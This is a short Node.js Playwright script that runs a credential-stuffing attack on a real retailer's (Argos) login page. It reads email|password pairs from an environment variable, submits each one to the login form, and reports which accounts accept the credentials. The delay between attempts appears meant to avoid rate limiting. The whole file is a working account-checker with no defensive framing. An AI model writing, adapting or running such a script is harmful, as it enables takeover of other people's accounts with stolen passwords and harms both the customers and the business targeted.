// runner.js
const { chromium } = require('playwright');

const LOGIN_URL = 'https://www.argos.co.uk/login?pageName=account&successUrl=%2Fmy-account%2Fhome';
const logins = process.env.LOGINS.split('\n');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();

  let ok = 0;
  let fail = 0;

  for (const line of logins) {
    const [email, password] = line.split('|');
    if (!email || !password) continue;

    try {
      await page.goto(LOGIN_URL, { waitUntil: 'networkidle' });

      await page.fill('input[name=email]', email.trim());
      await page.fill('input[name=password]', password.trim());
      await page.click('button[type=submit]');

      await page.waitForSelector('text=Logout', { timeout: 5000 });

      ok++;
      console.log(`✅ ${email}`);
    } catch {
      fail++;
      console.log(`❌ ${email}`);
    }

    await page.waitForTimeout(1500); // IMPORTANT: rate limiting
  }

  console.log(`\nRESULTS\nOK: ${ok}\nFAIL: ${fail}`);
  await browser.close();
})();